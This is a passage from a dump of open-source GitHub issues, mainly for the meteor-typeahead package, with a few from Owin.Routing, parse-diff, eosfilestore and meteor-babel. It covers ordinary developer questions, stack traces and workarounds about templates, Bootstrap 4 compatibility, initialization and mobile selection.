        &lt;p class="suggestionTitle"&gt;{{name}}&lt;/p&gt;
        &lt;p class="suggestionCity"&gt;{{city}}&lt;/p&gt;
    &lt;/div&gt;
&lt;/template&gt;
```

Then in your helper...

```
Template.companySearch.helpers({
    dispatchCompanies: function () {
        return [
            {
                name: 'dispatchCompanies',
                valueKey: 'name',
                display: 'name',
                local: function() { return DispatchCompanies.find().fetch(); },
                template: 'companiesTemplate'
            }
        ];
    }
});
```

I haven't been able to find out how to define multiple custom templates though...

Hope this helps...
</Body>
    </Comment>
    <Comment>
      <Owner>kevinwu</Owner>
      <Body>for me, custom templates don't work either. Could the package author provide more info on this issue?</Body>
    </Comment>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@kevinwu [demo app](https://github.com/sergeyt/meteor-typeahead/blob/master/demo/demo.html#L136) can help. I've just run it and the sample with custom templates is still functioning. Extracted example:&#13;
&#13;
template:&#13;
&#13;
```html&#13;
&lt;template name="custom_template"&gt;&#13;
 &lt;div&gt;&#13;
  &lt;h2&gt;Using custom template&lt;/h2&gt;&#13;
  &lt;div class="form-group example-twitter-oss"&gt;&#13;
   &lt;input class="form-control typeahead" name="repo" type="text" placeholder="open source projects by Twitter"&#13;
       autocomplete="off" spellcheck="off"&#13;
       data-source="repos" data-templates="repo;empty:noresults"/&gt;&#13;
  &lt;/div&gt;&#13;
  &lt;div class="gist"&gt;&#13;
   {{{gist 'sergeyt' '8054682'}}}&#13;
  &lt;/div&gt;&#13;
  &lt;div class="gist"&gt;&#13;
   {{{gist 'sergeyt' '8054730'}}}&#13;
  &lt;/div&gt;&#13;
 &lt;/div&gt;&#13;
&lt;/template&gt;&#13;
&#13;
&lt;template name="repo"&gt;&#13;
 &lt;p class="repo-language"&gt;{{language}}&lt;/p&gt;&#13;
 &lt;p class="repo-name"&gt;{{name}}&lt;/p&gt;&#13;
 &lt;p class="repo-description"&gt;{{description}}&lt;/p&gt;&#13;
&lt;/template&gt;&#13;
&#13;
&lt;template name="noresults"&gt;&#13;
 &lt;span&gt;No results found&lt;/span&gt;&#13;
&lt;/template&gt;&#13;
```&#13;
&#13;
and JavaScript helper:&#13;
&#13;
```js&#13;
Template.custom_template.helpers({&#13;
    repos: function(){&#13;
        return Repos.find().fetch();&#13;
    }&#13;
});&#13;
```&#13;
</Body>
    </Comment>
  </Issue_584>
  <Issue_585>
    <Repository>meteor-typeahead</Repository>
    <Title>compatibility with twbs 4</Title>
    <Owner>sergeyt</Owner>
    <Body>Hey,
Am trying to integrate twbs alpha 4 with the typeahead.
Any settings I need to change to make it work with twbs 4?
Appreciate any help.

It gives me:

meteor add sergeyt:typeahead@0.11.1_8
 =&gt; Errors while adding packages:             

While selecting package versions:
error: Conflict: Constraint twbs:bootstrap@3.0.0 is not satisfied by twbs:bootstrap 4.0.0-alpha2.
Constraints on package "twbs:bootstrap":
- twbs:bootstrap@4.0.0-alpha2 &lt;- top level
- twbs:bootstrap@3.0.0 &lt;- sergeyt:typeahead 0.11.1_8
</Body>
    <State>open</State>
    <Comment>
      <Owner>honwlt</Owner>
      <Body>As a workaround, I have downloaded the source and put it in a local package.
And I updated the package.js to 
api.use('twbs:bootstrap@4.0.0-alpha2', 'client', {weak: true});

And also updated the css to [typeaheadjs.css](https://github.com/bassjobsen/typeahead.js-bootstrap4-css)

This seems to work with twbs 4.

I am wondering whats the right way to achieve the same.
</Body>
    </Comment>
  </Issue_585>
  <Issue_586>
    <Repository>meteor-typeahead</Repository>
    <Title>Typeahead does not always initialize</Title>
    <Owner>sergeyt</Owner>
    <Body>Hello, 

I have seen issues about initialization.  Sometimes it works for me, sometimes it does not.  What would cause this intermittent issue?  Thanks.

input id="new-practice" class="form-control typeahead" autocomplete="off" data-select="selected" name="practices" type="text" data-source="practices"

Template.movePhysician.rendered = function() {
    $('#movePhysicianModal').modal('hide');
    Meteor.typeahead.inject();
}

Template.movePhysician.helpers({
    practices:function() {
        return practices.find().fetch().map(function (practice) {
            return practice.name;
        })
    },
    activePhysician:function() {
        return Session.get("activePhysician");
    },
    selected: function(event, suggestion, practices) {
        console.log(suggestion);
    }
})
</Body>
    <State>open</State>
    <Comment>
      <Owner>ydaniel98</Owner>
      <Body>I'm having the same issue. Typeahead only initializes sometimes and when it does, it doesn't autocomplete.</Body>
    </Comment>
  </Issue_586>
  <Issue_587>
    <Repository>meteor-typeahead</Repository>
    <Title>Header and footer support</Title>
    <Owner>sergeyt</Owner>
    <Body>First it works great. thanks for the great package.
I've one usability issue.
data-template is applied to each item in db colletion or array.
We have no way to specify the footer that says "No match? Please click here"
Is there a way to give the header &amp; footer (clickable)?
Thanks
</Body>
    <State>open</State>
    <Comment>
      <Owner>trungvt</Owner>
      <Body>I resolved this problem by setting up the dataset for text input, follow the docs of `Multiple datasets`.

``` html
&lt;template name="demo"&gt;
  &lt;div class="form-group"&gt;
    &lt;input class="form-control typeahead" name="team" type="text"
           placeholder="NBA and NHL teams"
           autocomplete="off" spellcheck="off"
           data-sets="teams"/&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;template name="team"&gt;
    &lt;h4&gt;&lt;i&gt;{{name}}&lt;/i&gt;&lt;/h4&gt;
&lt;/template&gt;

&lt;template name="footer"&gt;
    &lt;div class="tt-suggestion tt-selectable"&gt;
    &lt;p class="repo-language"&gt;
      &lt;a href="#" style="color: #000000;"&gt;
        View more...
      &lt;/a&gt;
    &lt;/p&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;template name="header"&gt;
    &lt;h3 class="league-name"&gt;NBA Teams&lt;/h3&gt;
&lt;/template&gt;
```

``` javascript
Template.demo.helpers({
  teams: function() {
    return [
      {
        name: 'nba-teams',
        valueKey: 'name',
        local: function() { return Nba.find().fetch(); },
        header: 'header',
        footer: 'footer',
        template: 'team'
      }
    ];
  }
});
```

Then you catch the `click` event of `a` tag in footer, etc. It's up to your view content. :)
</Body>
    </Comment>
  </Issue_587>
  <Issue_588>
    <Repository>meteor-typeahead</Repository>
    <Title>Data being returned but dropdown not showing</Title>
    <Owner>sergeyt</Owner>
    <Body>I noticed that a typeahead field that I had which was working earlier has stopped showing the results recently (or could be a couple months ago, not sure). I tried doing a console log and I see that the data is present from the `Meteor.call`. 

When I inspect the element, I see classes `tt-menu tt-empty tt-open` instead of `tt-dropdown-menu` from what I remember from before. Are those classes what they should be when there is data returned?

Here is the helper which I have tested and is working:

```
        typeahead: function () {
         return [
                     {
                 name: 'gearCategories',
                 valueKey: 'label',
                 displayKey: 'label',
                 source: function(query, callback) { Meteor.call("typeAheadCategories",  query, {}, function(err, res) { if (!err) callback(res); }); },
                 header: '&lt;h4 class="tt-header"&gt;Categories&lt;/h4&gt;'
             },
                         {
                 name: 'gearSubCategories',
                 valueKey: 'label',
                 displayKey: 'label',
                 source: function(query, callback) { Meteor.call("typeAheadSubCategories",  query, {}, function(err, res) { if (!err) callback(res); }); },
                 header: '&lt;h4 class="tt-header"&gt;Sub Categories&lt;/h4&gt;'
             },
             {
                 name: 'gearBrands',
                 valueKey: 'name',
                 displayKey: 'name',
                 source: function(query, callback) { Meteor.call("typeAheadBrands",  query, {}, function(err, res) { if (!err) callback(res); }); },
                 header: '&lt;h4 class="tt-header"&gt;Brands&lt;/h4&gt;'
             }
         ];
    }
```

And the input text:

```
    &lt;div class="form-group has-feedback no-margin"&gt;
            &lt;input aria-label="Search" type="text" class="form-control typeahead no-padding" name="brand" id="searchGr" placeholder="Search"  autocomplete="off" spellcheck="off" data-sets="typeahead" value={{value}}&gt;
        &lt;i class="search-icon form-control-feedback"&gt;&lt;/i&gt;
    &lt;/div&gt;  
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@niranjans since typeahead.js v0.11 `source` function takes three arguments, last one is async callback, second one is sync callback.
</Body>
    </Comment>
    <Comment>
      <Owner>niranjans</Owner>
      <Body>Oh got it. I tried looking at the change-logs but could not find a breaking change. Thanks for pointing that out.
</Body>
    </Comment>
  </Issue_588>
  <Issue_589>
    <Repository>meteor-typeahead</Repository>
    <Title>Width of Box doesn't follow css rules</Title>
    <Owner>sergeyt</Owner>
    <Body>For some reason no matter what widths I set the box to it will always revert to what it wants.  What css am I missing here so that I can have this look and act like a regular sized textbox?
</Body>
    <State>open</State>
    <Comment>
      <Owner>bmordan</Owner>
      <Body>Same here. How can this be tamed?
</Body>
    </Comment>
    <Comment>
      <Owner>JTL1992</Owner>
      <Body>i notice that there is a .tt-input css ,i don't know where is it en my project, i think it is the reason of that issue, @atheriault @bmordan i have tried add .twitter-typeahead { width: 100%; } to fill parent ,it works !
</Body>
    </Comment>
  </Issue_589>
  <Issue_590>
    <Repository>meteor-typeahead</Repository>
    <Title>Cannot read property 'value' of undefined</Title>
    <Owner>sergeyt</Owner>
    <Body>hi, i am getting this error, but i cannot find where is occurred

```
&gt; args &gt;&gt; undefined undefined undefined

index.js:121 TypeError: Cannot read property 'value' of undefined
    at http://localhost:3000/packages/sergeyt_typeahead.js?0ed9586690ee3bfbc3b6c6983d55ddc2dcaf0b40:218:67
    at String.reverseArgs (http://localhost:3000/packages/sergeyt_typeahead.js?0ed9586690ee3bfbc3b6c6983d55ddc2dcaf0b40:94:28)
    at Function.jQuery.extend.each (http://localhost:3000/packages/jquery.js?dd8bac56f8fd3666d433d2285ae01e52597cc51a:417:23)
    at Object._.each (http://localhost:3000/packages/sergeyt_typeahead.js?0ed9586690ee3bfbc3b6c6983d55ddc2dcaf0b40:92:19)
    at SearchIndex.tokenize [as datumTokenizer] (http://localhost:3000/packages/sergeyt_typeahead.js?0ed9586690ee3bfbc3b6c6983d55ddc2dcaf0b40:217:23)
    at http://localhost:3000/packages/sergeyt_typeahead.js?0ed9586690ee3bfbc3b6c6983d55ddc2dcaf0b40:478:51
    at reverseArgs (http://localhost:3000/packages/sergeyt_typeahead.js?0ed9586690ee3bfbc3b6c6983d55ddc2dcaf0b40:94:28)
    at Function.jQuery.extend.each (http://localhost:3000/packages/jquery.js?dd8bac56f8fd3666d433d2285ae01e52597cc51a:417:23)
    at Object._.each (http://localhost:3000/packages/sergeyt_typeahead.js?0ed9586690ee3bfbc3b6c6983d55ddc2dcaf0b40:92:19)
    at SearchIndex.window.SearchIndex._.mixin.add (http://localhost:3000/packages/sergeyt_typeahead.js?0ed9586690ee3bfbc3b6c6983d55ddc2dcaf0b40:475:19)
searchFilter.es6:14 

Uncaught TypeError: async is not a function
```

html

```
&lt;input class="typeahead search" name="search" type="text"
                     placeholder="Marketing Assistant,  HR Advisor, Software Engineer..."
                     autocomplete="off" spellcheck="off"
                     data-source="suggestions"
                     data-selected="selected"
                     data-min-length=0
                     data-limit="100"
                     data-template="suggestion" /&gt;
```

Template helper

```
suggestions(query, sync, async) {
    console.log('&gt; args &gt;&gt;', query, sync, async);
    setTimeout(function() {
      var data = SuggestionsSearch.getData();
      async(data);
    }, 30);
  },
```

as you can see `console.log('&gt; args &gt;&gt;', query, sync, async);` is logged befor the error `Cannot read property 'value' of undefined` but all args are `undefined`

any suggestion on this?
</Body>
    <State>open</State>
    <Comment>
      <Owner>mvgalle</Owner>
      <Body>You'll want to make sure to update "data-selected" to "data-select"
</Body>
    </Comment>
    <Comment>
      <Owner>kevinwu</Owner>
      <Body>did you solve the problem?</Body>
    </Comment>
  </Issue_590>
  <Issue_591>
    <Repository>meteor-typeahead</Repository>
    <Title>Is it possible to use Template event maps with the typeahead events?</Title>
    <Owner>sergeyt</Owner>
    <Body>I'd love to do it this way as it feels more organized but I can't find any documentation on this approach. Thanks!
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@matthewforr this feature would be useful. Now it does not work, but it should be easy to implement. Please feel free to make a PR for this.
</Body>
    </Comment>
  </Issue_591>
  <Issue_592>
    <Repository>meteor-typeahead</Repository>
    <Title>Server side search not working</Title>
    <Owner>sergeyt</Owner>
    <Body>It seems the server-side search doesn't work on the demo http://typeahead.meteor.com/.
</Body>
    <State>open</State>
    <Comment>
      <Owner>kyooriouskoala</Owner>
      <Body>It works. The page lacks the information about the data that you can query.
Wait for a while until the page shows the code snippets instead of just the search boxes.
After that, try typing in letter 's' or 't' in the server side search box. 
</Body>
    </Comment>
    <Comment>
      <Owner>pors</Owner>
      <Body>It indeed does work, the problem with the demo setup is that the autopublish package is installed. This results in the server publishing the 160,000 documents (ending up in your browser), making it all very very slow.

It would have been better if the server side demo had its own isolated meteor demo project (with autopublish removed).
</Body>
    </Comment>
  </Issue_592>
  <Issue_593>
    <Repository>meteor-typeahead</Repository>
    <Title>Is there a way to enable multiple tags in one input?</Title>
    <Owner>sergeyt</Owner>
    <Body>I would like to separate tags by comma. As soon as I enter a comma, start suggesting new tags. Is this possible?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@shanespace this should be feasible with custom data-source function in your template helpers. The function takes three arguments `(query, sync, async)` where `query` is input text with all tags. You could process this query to return suggestions for last tag.
</Body>
    </Comment>
  </Issue_593>
  <Issue_594>
    <Repository>meteor-typeahead</Repository>
    <Title>Typeahead errors when logging out</Title>
    <Owner>sergeyt</Owner>
    <Body>When logging out, I get the following typeahead errors:

```
Error: Exception from Tracker recompute function:

&gt; Before: 28931ms (diff: 28931ms)
    at usePostMessage (http://localhost:3000/packages/meteor.js?43b7958c1598803e94014f27f5f622b0bddc0aaf:381:12)
    at http://localhost:3000/packages/meteor.js?43b7958c1598803e94014f27f5f622b0bddc0aaf:410:3
    at http://localhost:3000/packages/meteor.js?43b7958c1598803e94014f27f5f622b0bddc0aaf:415:4
    at http://localhost:3000/packages/meteor.js?43b7958c1598803e94014f27f5f622b0bddc0aaf:1086:3

&gt; Before: 31387ms (diff: 2456ms)
    at Array.forEach (native)

---
Error: TypeError: Cannot read property 'name' of undefined

    at http://localhost:3000/packages/sergeyt_typeahead.js?8199dbdaa0384feeb3570910957df28ee08230b4:193:67
    at String.reverseArgs (http://localhost:3000/packages/sergeyt_typeahead.js?8199dbdaa0384feeb3570910957df28ee08230b4:78:28)
    at Function.jQuery.extend.each (http://localhost:3000/packages/jquery.js?dd8bac56f8fd3666d433d2285ae01e52597cc51a:417:23)
    at Object._.each (http://localhost:3000/packages/sergeyt_typeahead.js?8199dbdaa0384feeb3570910957df28ee08230b4:76:19)
    at SearchIndex.tokenize [as datumTokenizer] (http://localhost:3000/packages/sergeyt_typeahead.js?8199dbdaa0384feeb3570910957df28ee08230b4:192:23)
    at http://localhost:3000/packages/sergeyt_typeahead.js?8199dbdaa0384feeb3570910957df28ee08230b4:456:51
    at reverseArgs (http://localhost:3000/packages/sergeyt_typeahead.js?8199dbdaa0384feeb3570910957df28ee08230b4:78:28)
    at Function.jQuery.extend.each (http://localhost:3000/packages/jquery.js?dd8bac56f8fd3666d433d2285ae01e52597cc51a:417:23)
    at Object._.each (http://localhost:3000/packages/sergeyt_typeahead.js?8199dbdaa0384feeb3570910957df28ee08230b4:76:19)
    at SearchIndex._.mixin.add (http://localhost:3000/packages/sergeyt_typeahead.js?8199dbdaa0384feeb3570910957df28ee08230b4:453:19)
```

I've tried explicitly destroying the typeahead beforehand, using `$(".typeahead").typeahead("destroy")`, but it doesn't help. I assume the problem is due to the underlying collection disappearing from minimongo and that change reactivity effecting, and breaking, typeahead.

Seen this? Any thoughts? Thanks much.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@benmgreene the issue should be fixed if we find a way to stop [tracker](https://github.com/sergeyt/meteor-typeahead/blob/master/index.js#L380). I guess the tracker.autorun should return some handle/function to stop tracking. This handle could be associated with typeahead instance and invoked on typeahead `destroy` event. Please feel free to send PR.
</Body>
    </Comment>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@benmgreene I din't find easy way to stop [computation](https://github.com/sergeyt/meteor-typeahead/blob/master/index.js#L381) (run by meteor tracker) on destroying typeahead instance. Current idea is to replace $.fn.typeahead  to intercept only typeahead('destroy') calls to invoke custom dispose function. Is it acceptable solution? It would be great if typeahead has support of `destroy` event. Now I can patch the typeahead.bundle.js to raise this event.
</Body>
    </Comment>
    <Comment>
      <Owner>benmgreene</Owner>
      <Body>@sergeyt thanks for your suggestions. I spent some time hacking on a solution -- see:

https://github.com/benmgreene/meteor-typeahead/commit/aabe1e8838f6d0ebb2c032c9f76404d9965beda8

This code works, but the problem is in getting it called. If I call `Meteor.typeahead.destroy()` from the template's `destroy` (or now `onDestroyed`) callback, it's already too late -- the `autorun`'s computation has already been invalidated.

The alternative is to call `Meteor.typeahead.destroy()` in a different template's event.  Currently this won't work because `Meteor.typeahead.destroy`, similarly to `Meteor.typeahead.inject`, limits the selector lookup to the current `Template.instance()` if there is one. It's easy enough to provide a bypass from that, but it'd be much cleaner to find a way to call it from the template's `destroy`/`onDestroyed` callback. Perhaps there's a way to defer the `autorun`?

Any thoughts?
</Body>
    </Comment>
    <Comment>
      <Owner>benmgreene</Owner>
      <Body>I went ahead and added the bypass, and it works, but it's definitely not ideal.
</Body>
    </Comment>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@benmgreene I think you are on right track. The solution looks good to me. Please go ahead to send PR.
</Body>
    </Comment>
  </Issue_594>
  <Issue_595>
    <Repository>meteor-typeahead</Repository>
    <Title>Use with meteor-bootstrap-tagsinput</Title>
    <Owner>sergeyt</Owner>
    <Body>https://github.com/ajduke/meteor-bootstrap-tagsinput

I'm using this package for my tags.

From the demo page of above

```
$('input').tagsinput({
  typeahead: {
    source: ['Amsterdam', 'Washington', 'Sydney', 'Beijing', 'Cairo']
  }
});
```

This will not call the typeahead. Is there something I have to specify to use this? From my understanding, having the typeahead information in the above should let me use typeahead without any additional code?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@sangyoo91 bootstrap-tagsinput requires typeahead jquery plugin to be loaded into app environment, you could try to add `sergeyt:typeahead` package into your app.
</Body>
    </Comment>
  </Issue_595>
  <Issue_596>
    <Repository>meteor-typeahead</Repository>
    <Title>search starts on page load, not on keyup</Title>
    <Owner>sergeyt</Owner>
    <Body>It seems like the way the demos are set up, it starts searching the collection immediately with no parameters, i.e. .find() everything. I didn't notice this until I dropped some logging into the search function. I'm looking into how to trigger this off keyup instead and will post if/when I figure it out, but thought I'd ask in case I'm missing something. Thanks!
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@DanAncona maybe lazy initialization of Bloodhound suggestion engine could fix this issue, now it is initialized when you setup `Meteor.typeahead` behavior for your input. Also you could try to lazily apply `typeahead` behavior on app level as workaround until it is not improved in this package.
</Body>
    </Comment>
  </Issue_596>
  <Issue_597>
    <Repository>meteor-typeahead</Repository>
    <Title>Pressing enter will no longer submit form</Title>
    <Owner>sergeyt</Owner>
    <Body>I'm currently using this with my meteor-editable package in an app. For some reason my app decided to update yesterday from `0.10.5_9` to `0.10.5_12`. Didn't think much of it at first but now my tests fail. The form I have it in in has no submit button, it relies on enter being pressed to submit the form this previously worked and no longer does. I did a diff between the two version commit shas and couldn't see anything that stood out as to why this would be happening.
</Body>
    <State>open</State>
    <Comment>
      <Owner>pawelos88</Owner>
      <Body>Hi,
It's the same in my app, pressing enter doesn't submit the form now.
</Body>
    </Comment>
    <Comment>
      <Owner>alochschmied</Owner>
      <Body>I am not sure if I am facing the same problem.

When I start typing the suggestions do appear and it works perfectly when I choose one by clicking with the mouse. However if I decide to just type and press enter, the suggestions list is not closed.

Is it supposed to close and if not, is there an API call that I can make after detecting "return pressed"?
</Body>
    </Comment>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>All UI related behavior issues should be directed to twitter [typeahead.js](https://github.com/twitter/typeahead.js) project since this repo is small wrapper around typeahead.js with friendly API for meteor integration. Try yo find similar issues in typeahead.js project or reproduce them in non-meteor browser environment.

Also it should be feasible to debug/detect what event handler prevents form submission.
</Body>
    </Comment>
    <Comment>
      <Owner>romant</Owner>
      <Body>Hi @sergeyt - thank you for putting this wrapper together. Very useful.

I too stumbled upon the blocking of the form submission.

Simply navigating to typeahed.js and entering anything followed by hitting `enter` - submits their form. Yet this is blocked with the current installation of the `meteor-typeahead`.
</Body>
    </Comment>
  </Issue_597>
  <Issue_598>
    <Repository>meteor-typeahead</Repository>
    <Title>Can't select typeahead on mobile</Title>
    <Owner>sergeyt</Owner>
    <Body>Hello,

I have had success using your package for the web. The package also works on mobile safari, which is great. However, when I try using it with iOS through phonegap, the typeahead suggestion is not selectable. When I press the typeahead selection, rather than autocompleting the remainder of the phrase, the suggestion dropdown disappears, and the text is left wherever you stopped typing.

This is tested with: sergeyt:typeahead@0.10.5_7, Meteor 1.0, iOS 8.0 (both iOS simulator and on physical device)

To test this out, try running the following on the demo app provided with this project (assumes you have XCode and iOS Simulator installed):

meteor add-platform ios
meteor run ios

In the first NBA teams textbox enter Char
Charlotte Bobcats witll appear as a suggestion
Click on the suggestion

Expected response: textbox autocompletes with Charlotte Bobcats
Actual response: textbox remains at Char and the suggestion dropdown disappears
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@jbrozena22 could you elaborate PR please? I don't have such environment now.
</Body>
    </Comment>
    <Comment>
      <Owner>cameroncruz</Owner>
      <Body>I am having the same issue.  It seems that on iOS (using Cordova), when the keyboard is active, tapping anywhere outside the keyboard will not register in the app.  Instead, tapping outside the keyboard will first hide the keyboard and unfocus from the input element.  Any tap events after that will trigger normally.

With typeahead, the suggestion dropdown is closed if the user unfocuses from the input element.  Therefore, on iOS, the user is never in a situation where they can tap on a suggestion and have it autocomplete.  

Is it possible to prevent the typeahead dropdown from closing when the user unfocuses from the input element?  Or manually control when/how a typeahead input is opened/closed? 

This is not an issue on Android devices, at least in my experience.
</Body>
    </Comment>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@cameroncruz I think it is possible to reproduce the issue using [typeahead](https://github.com/twitter/typeahead.js) inside non-meteor Cordova environment, right? This package is wrapper around typeahead and such kind of issue should be fixed in typeahead code rather than wrapper. But if you find a workaround fix we could add it the package temporarily until the fix is included to typeahead code.
</Body>
    </Comment>
    <Comment>
      <Owner>cameroncruz</Owner>
      <Body>@sergeyt Yes, after researching this further I found [this issue](https://github.com/twitter/typeahead.js/issues/792) and I guess it is in fact a conflict between typeahead and fastclick? 

The fix suggested in that issue was to comment out `this.dropdown.empty();` in onBlurred() like this:

`_onBlurred: function onBlurred() {                                                                         // 1522`
`this.isActivated = false;                                                                              // 1523`
`//this.dropdown.empty();                                                                                 // 1524`
`this.dropdown.close();                                                                                 // 1525`
`},`

I haven't tested this for myself yet.  But you're right, this is not an issue with your package, and it seems that the people working on typeahead are already aware of the problem.
</Body>
    </Comment>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@cameroncruz thanks for research and info
</Body>
    </Comment>
    <Comment>
      <Owner>designbyadrian</Owner>
      <Body>:+1: also have this issue.
</Body>
    </Comment>
  </Issue_598>
  <Issue_599>
    <Repository>Owin.Routing</Repository>
    <Title>Expose Register Method on RouteBuilder to the public</Title>
    <Owner>sergeyt</Owner>
    <Body>I need to register handlers for things other than the 5 main "Get", "Post", "Patch", "Delete", "Put" methods.  Is there any technical reason I'm not seeing that would prevent this from happening?

There also doesn't seem to be a way to let handlers fall through the pipeline to other handlers downstream (aka next.Invoke()).  Could be useful to have a Route.Apply type method that will call the next item in the pipeline.

Any reason for not implementing this and PRing?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@jamesbascle please feel free to make a PR.
</Body>
    </Comment>
  </Issue_599>
  <Issue_600>
    <Repository>Owin.Routing</Repository>
    <Title>Allow to pass multiple AppFunc/HandlerFuncs to Get/Post/etc</Title>
    <Owner>sergeyt</Owner>
    <Body>In express, it's possible to pass multiple middleware functions to the get/post/etc functions, which then get called one after another. It works like this:

if you pass one function, it gets called with the next function of the parent middleware (as it works now).
If you pass two functions, the first function gets called with the second function as next, and the second function gets called with the next function of the parent middleware.

So, every function gets called with the next function as "next" (obviously) and the last function gets called with the next function of the parent.

What do you think about adding this functionality to Owin.Routing aswell?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>hi @VanCoding, now I don't have any interest to extend this package with any functionality since ASP.NET Core embeds Owin and such package is not needed anymore. Please feel free to send PR with this feature.
</Body>
    </Comment>
    <Comment>
      <Owner>VanCoding</Owner>
      <Body>@sergeyt interesting. Does ASP.NET Core also include a router like this, or why is this package obsolete? Isn't the whole idea behind OWIN the ability to compose the application from different middlewares, like this router?

I've first looked at WebAPI 2, but when I've found out MS also introduced OWIN, I've considered it the much better alternative, as it seems much more flexible.

But I'm pretty new on this topic, as I'm currently forced to use C# for an application instead of Node.js . Did I maybe miss something important? I of course don't want to ride a dead horse :P
</Body>
    </Comment>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>&gt; Does ASP.NET Core also include a router like this?

yes, but only declarative part with attributes, functional api could be easily ported too since there is similar IAppBuilder interface as in owin
</Body>
    </Comment>
  </Issue_600>
  <Issue_601>
    <Repository>parse-diff</Repository>
    <Title>Report binary diff</Title>
    <Owner>sergeyt</Owner>
    <Body>If a diff contains binary files, it produces messages like:&#13;
&#13;
```&#13;
diff --git a/screenshots/split-view.png b/screenshots/split-view.png&#13;
index 1c352c2..e1fb381 100644&#13;
Binary files a/screenshots/split-view.png and b/screenshots/split-view.png differ&#13;
```&#13;
&#13;
It could be nice if `parse-diff` gives a `binary: true` flag in file object</Body>
    <State>open</State>
    <Comment>
      <Owner>sergeyt</Owner>
      <Body>@otakustay please feel free to make a pull request</Body>
    </Comment>
  </Issue_601>
  <Issue_602>
    <Repository>eosfilestore</Repository>
    <Title>Catch HTTP Error / 504 when pushing transaction</Title>
    <Owner>grigio</Owner>
    <Body>https://github.com/grigio/eosfilestore/blob/master/src/core.ts#L35&#13;
&#13;
Can fail with a 504 HTTP error and no attempt to retry is done thereby failing the upload all together. The upload/push tx should be tried again if the reason it failed is a non-resource (CPU/NET) reason.</Body>
    <State>open</State>
    <Comment>
      <Owner>grigio</Owner>
      <Body>Hi thanks for the report. Currently who does the transactions have to be sure to have enough resources to process them. NET is stable per tx but CPU depends on network congestion.&#13;
Retry currently isn't supported</Body>
    </Comment>
    <Comment>
      <Owner>Novusphere</Owner>
      <Body>Even with enough resources (NET/CPU) I have encountered 504 HTTP errors when testing uploading with "large" (~600kb) files, likely because the BP end point to push the transaction thinks I'm spamming, not the EOS network itself.</Body>
    </Comment>
    <Comment>
      <Owner>grigio</Owner>
      <Body>Currently the biggest file I've tried to upload successfully is 140kb, probably there are some limitations on eos BP apis</Body>
    </Comment>
  </Issue_602>
  <Issue_603>
    <Repository>meteor-babel</Repository>
    <Title>Does not work with Velocity</Title>
    <Owner>grigio</Owner>
    <Body>When this package (or another Babel npm package I tried) is installed, the Velocity testing package fails to load.  

```
I20150629-16:44:24.817(-5)? Exception in callback of async function: Error: Match error: Expected Number in field port
I20150629-16:44:24.817(-5)?     at checkSubtree (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/check.js:270:11)
I20150629-16:44:24.817(-5)?     at /Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/check.js:311:9
I20150629-16:44:24.817(-5)?     at Function._.each._.forEach (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/underscore.js:147:22)
I20150629-16:44:24.817(-5)?     at checkSubtree (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/check.js:308:5)
I20150629-16:44:24.817(-5)?     at check (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/check.js:50:5)
I20150629-16:44:24.817(-5)?     at [object Object].Meteor.methods.velocity/mirrors/init (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/velocity_core.js:1202:7)
I20150629-16:44:24.817(-5)?     at maybeAuditArgumentChecks (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/ddp.js:2445:12)
I20150629-16:44:24.818(-5)?     at /Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/ddp.js:2358:18
I20150629-16:44:24.818(-5)?     at [object Object]._.extend.withValue (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/meteor.js:989:17)
I20150629-16:44:24.818(-5)?     at [object Object]._.extend.apply (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/ddp.js:2357:45)
I20150629-16:44:24.818(-5)?     at [object Object]._.extend.call (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/ddp.js:2300:17)
I20150629-16:44:24.818(-5)?     at _startMirror (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/velocity_core.js:1398:12)
I20150629-16:44:24.818(-5)?     at /Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/velocity_core.js:1301:9
I20150629-16:44:24.818(-5)?     at runWithEnvironment (/Users/ghobbs/MeteorApp/.meteor/local/build/programs/server/packages/meteor.js:1041:24)
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>grigio</Owner>
      <Body>`Error: Match error: Expected Number in field port` it could be related to https://github.com/grigio/meteor-babel/issues/5
</Body>
    </Comment>
  </Issue_603>
  <Issue_604>
    <Repository>meteor-babel</Repository>
    <Title>Meteor router extends doesn't work properly with es6.js route file</Title>
    <Owner>grigio</Owner>
    <Body>I create issue here as well as in https://github.com/iron-meteor/iron-router/issues/1328

https://gist.github.com/Firfi/3c0950b57497bdc2a96e

error is `Error: Handler with name 'onBeforeAction' already exists`., it appears only when I visit the route
</Body>
    <State>open</State>
    <Comment>
      <Owner>grigio</Owner>
      <Body>It doesn't seem to me a `grigio:babel` issue. Have you tried to use .js instead .jsx or .es6.js to see if happens as well in the current javascript?
</Body>
    </Comment>
    <Comment>
